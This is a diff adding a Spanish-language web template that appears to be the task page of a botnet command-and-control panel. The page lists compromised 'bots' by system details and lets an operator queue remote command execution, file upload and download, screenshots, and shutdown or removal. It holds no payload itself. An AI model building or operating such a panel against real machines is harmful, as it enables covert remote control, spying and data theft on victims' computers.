@@ -1,0 +1,171 @@
+{% extends "layout.html" %}
+
+{%block content%}
+
+<div>
+    <h1>&#128203 Añadir nueva tarea</h1>
+    <hr>
+</div>
+
+<!-- TABLA DE BOTS DISPONIBLES -->
+{% if total != 0 %}
+
+<div class="mb-3">
+    <h5>Tabla de bots disponibles</h5>
+</div>
+
+<form class="needs-validation" action="" method="post" enctype="multipart/form-data">
+    <table class="table mb-5">
+        <thead>
+            <tr class="row-table">
+                <th scope="col" class="row-table text-left">Bot ID</th>
+                <th scope="col">SO</th>
+                <th scope="col">Nodo</th>
+                <th scope="col">Versión SO</th>
+                <th scope="col">Número de compilación</th>
+                <th scope="col">Juego de instrucciones</th>
+                <th scope="col">Procesador</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <th scope="row" class="row-table text-left"><div class="custom-control custom-checkbox">
+                    <input type="checkbox" name="bot_all" class="custom-control-input" id="select-all" value="" onclick=select_all()>
+                    <label class="custom-control-label" for="select-all">Seleccionar todos los bots</label></th>
+            </tr>
+            {% for bot in bots %}
+            <tr>
+                <th scope="row" class="row-table text-left"><div class="custom-control custom-checkbox">
+                    <input type="checkbox" name="bot" class="custom-control-input" id="{{ bot.bot_id }}" value="{{ bot.bot_id }}" onclick=check()>
+                    <label class="custom-control-label" for={{ bot.bot_id }}>{{ bot.bot_id }}</label>
+                </div></th>
+                <td class="row-table">{{ bot.system }} </td>
+                <td class="row-table">{{ bot.node }} </td>
+                <td class="row-table">{{ bot.release }} </td>
+                <td class="row-table">{{ bot.version }} </td>
+                <td class="row-table">{{ bot.machine }} </td>
+                <td class="row-table">{{ bot.processor }} </td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+
+    <div>
+        <h5>Seleccione una tarea</h5>
+    </div>
+
+    <div>
+        <select class="form-control" name="selection" id="selection" onchange="select()">
+            <option default value="">Seleccione una opción</option>
+            <option value="CMD">Ejecución de código remoto</option>
+            <option value="UPLOAD">Subir fichero al host remoto</option>
+            <option value="DOWNLOAD">Descargar fichero del host remoto</option>
+            <option value="SCREENSHOT">Tomar captura de pantalla del host remoto</option>
+            <option value="SHUTDOWN">Apagar bot</option>
+            <option value="DELETE">Eliminar bot</option>
+        </select>
+        <div class="invalid-feedback">Por favor seleccione una tarea</div>
+    </div>
+
+    <div class="pt-5">
+        <h5>Código remoto</h5>
+        <hr>
+    </div>
+    <div class="input-group mb-3">
+        <div class="input-group-prepend">
+            <span class="input-group-text" id="basic-addon1">usuario@host:~$</span>
+        </div>
+        <input id="cmd" name="cmd" type="text" class="form-control" placeholder="Comando" aria-label="Username" aria-describedby="basic-addon1" required>
+        <div class="invalid-feedback">Por favor añada un comando</div>
+    </div>
+
+    <div>
+        <h5>Subir fichero</h5>
+        <hr>
+    </div>
+    <div class="form-group">
+        <label for="exampleFormControlFile1">Seleccione un fichero</label>
+        <input id="upload" name="fichero" type="file" class="form-control-file" required>
+        <div class="invalid-feedback">Por favor seleccione un fichero</div>
+      </div>
+
+    <div>
+        <h5>Descargar fichero</h5>
+        <hr>
+    </div>
+    <div class="input-group mb-3">
+        <div class="input-group-prepend">
+            <span class="input-group-text" id="basic-addon1">URL fichero</span>
+        </div>
+        <input id="download" name="url_fichero" type="text" class="form-control" placeholder="URL remota del fichero" aria-label="RemoteFile" aria-describedby="basic-addon1" required>
+        <div class="invalid-feedback">Por favor escriba la url del fichero remoto</div>
+    </div>
+
+    <button type="submit" id="enviar" class="btn btn-primary mt-3">Añadir tarea</button>
+</form>
+
+{% else %}
+
+<p>&#10060 No hay bots disponibles para añadir tareas</p>
+
+{% endif %}
+
+<script>
+
+    window.onload = document.getElementById("enviar").disabled = true;
+    window.onload = hide()
+
+    function check() {
+        var checkboxes = document.querySelectorAll('input[type="checkbox"]:checked').length;
+        var selection = document.getElementById("selection").value;
+        if (checkboxes <= 0)
+        {
+            document.getElementById("enviar").disabled = true;
+        }
+        else if (selection == "")
+        {
+            document.getElementById("enviar").disabled = true;
+        }
+        else
+        {
+            document.getElementById("enviar").disabled = false;
+        }
+    }
+
+    function hide() {
+        document.getElementById("cmd").disabled = true;
+        document.getElementById("upload").disabled = true;
+        document.getElementById("download").disabled = true;
+    }
+
+    function select() {
+        var x = document.getElementById("selection").value;
+        if (x == "CMD"){
+            hide()
+            check()
+            document.getElementById("cmd").disabled = false;
+        }
+        else if (x == "UPLOAD"){
+            hide()
+            check()
+            document.getElementById("upload").disabled = false;
+        }
+        else if (x == "DOWNLOAD"){
+            hide()
+            check()
+            document.getElementById("download").disabled = false;;
+        }
+        else
+            hide()
+            check()
+    }
+
+    function select_all() {
+        var list = document.querySelectorAll('input[type="checkbox"]');
+        for (var item of list) {
+            item.checked = true;
+        }
+    }
+</script>
+
+{% endblock %}
